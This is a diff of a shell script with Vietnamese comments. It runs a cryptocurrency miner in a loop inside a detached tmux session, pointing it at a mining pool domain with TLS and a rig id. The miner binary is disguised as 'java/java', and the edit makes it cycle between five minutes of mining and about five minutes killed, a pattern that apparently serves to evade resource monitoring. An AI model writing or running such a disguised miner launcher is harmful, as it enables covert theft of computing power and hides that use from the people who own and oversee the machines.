@@ -34,16 +34,18 @@ fi
 # 🔁 Vòng lặp chạy miner
 echo "[+] Vòng lặp ..."
 while true; do
-    pkill -f "$(pwd)/java/java" 2>/dev/null
-    echo "[+] kill process kill process kill process - sleep 5s..."
-    sleep 300
-
+    # 1. Chạy process
     tmux kill-session -t $SESSION 2>/dev/null
-    echo "[+] run process run process run process - sleep 5 phút..."
+    sleep 2
     tmux new-session -s $SESSION -d
     tmux send-keys -t $SESSION "
         $(pwd)/java/java -o $DOMAIN --tls -k -t 4 --rig-id $NAME_WORK
     " C-m
-    echo "[+] start process start process start process - sleep 120s..."
-    sleep 300
+    echo "[+] start process start process start process start process start process start process - chạy 5 phút..."
+    sleep 300   # chạy 5 phút
+
+    # 2. Kill process
+    pkill -f "$(pwd)/java/java" 2>/dev/null
+    echo "[+] kill process kill process kill process kill process kill process - nghỉ 5 phút..."
+    sleep 298   # nghỉ 5 phút trước khi chạy lại
 done
